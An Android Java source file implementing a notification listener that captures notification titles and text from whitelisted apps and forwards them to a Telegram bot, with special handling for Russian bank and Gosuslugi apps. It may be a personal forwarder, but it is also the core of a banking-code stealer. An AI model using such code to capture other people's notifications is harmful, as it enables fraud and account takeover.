package com.gincz.telegrambot.service;

import android.app.Notification;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import com.gincz.telegrambot.data.ConfigManager;
import com.gincz.telegrambot.transport.TelegramClient;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Locale;
import java.util.Map;

public class NotificationListener extends NotificationListenerService {
    private static final String TAG = "GIN-NotificationList";

    // Deduplication cache: key -> timestamp (30 second expiry)
    private static final Map<String, Long> RECENT_NOTIFICATIONS = new LinkedHashMap<String, Long>(50, 0.75f, true) {
        @Override
        protected boolean removeEldestEntry(Map.Entry<String, Long> eldest) {
            return size() > 100;
        }
    };

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;

        ConfigManager config = ConfigManager.getInstance(this);
        if (!config.isServiceActive()) return;

        String packageName = sbn.getPackageName();
        if (packageName == null || packageName.equals(getPackageName())) {
            // Ignore own notifications
            return;
        }

        // Whitelist Check
        if (!config.isPackageWhitelisted(packageName)) {
            return;
        }

        Notification notification = sbn.getNotification();
        if (notification == null) return;

        // Ignore ongoing foreground services and permanent background notifications
        if ((notification.flags & Notification.FLAG_ONGOING_EVENT) != 0 ||
            (notification.flags & Notification.FLAG_NO_CLEAR) != 0) {
            return;
        }

        Bundle extras = notification.extras;
        if (extras == null) return;

        CharSequence titleCs = extras.getCharSequence(Notification.EXTRA_TITLE);
        CharSequence textCs = extras.getCharSequence(Notification.EXTRA_TEXT);
        CharSequence bigTextCs = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);

        String title = titleCs != null ? titleCs.toString().trim() : "";
        String text = bigTextCs != null ? bigTextCs.toString().trim() : (textCs != null ? textCs.toString().trim() : "");

        if (title.isEmpty() && text.isEmpty()) {
            return;
        }

        // Deduplication Check: hash(packageName + title + text)
        String dedupKey = packageName + "|" + title + "|" + text;
        long now = System.currentTimeMillis();
        synchronized (RECENT_NOTIFICATIONS) {
            // Purge expired entries older than 30 seconds
            Iterator<Map.Entry<String, Long>> it = RECENT_NOTIFICATIONS.entrySet().iterator();
            while (it.hasNext()) {
                Map.Entry<String, Long> entry = it.next();
                if (now - entry.getValue() > 30000) {
                    it.remove();
                }
            }

            Long lastSeen = RECENT_NOTIFICATIONS.get(dedupKey);
            if (lastSeen != null && (now - lastSeen) < 30000) {
                Log.d(TAG, "Ignoring duplicate notification from " + packageName + " within 30s");
                return;
            }
            RECENT_NOTIFICATIONS.put(dedupKey, now);
        }

        // Get readable application label
        String appName = packageName;
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            appName = pm.getApplicationLabel(ai).toString();
        } catch (Exception ignored) {}

        SimpleDateFormat timeFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
        String timeStr = timeFormat.format(new Date(sbn.getPostTime() > 0 ? sbn.getPostTime() : now));

        // Format message
        String icon = "🏦";
        String lowerPkg = packageName.toLowerCase();
        if (lowerPkg.contains("gosuslugi")) {
            icon = "🏛";
        } else if (!lowerPkg.contains("bank") && !lowerPkg.contains("tinkoff") && !lowerPkg.contains("sber") && !lowerPkg.contains("vtb")) {
            icon = "📲";
        }

        StringBuilder html = new StringBuilder();
        html.append(icon).append(" <b>[").append(TelegramClient.escapeHtml(appName)).append(" • Push]</b> <i>").append(timeStr).append("</i>\n");
        if (!title.isEmpty()) {
            html.append("<b>Заголовок:</b> ").append(TelegramClient.escapeHtml(title)).append("\n");
        }
        if (!text.isEmpty()) {
            html.append("<b>Текст:</b> ").append(TelegramClient.escapeHtml(text));
        }

        Log.i(TAG, "Forwarding Push Notification from " + appName + " (" + packageName + ")");
        TelegramClient.sendAsync(this, html.toString(), true, null);
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.i(TAG, "NotificationListener connected successfully");
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        Log.w(TAG, "NotificationListener disconnected");
    }
}
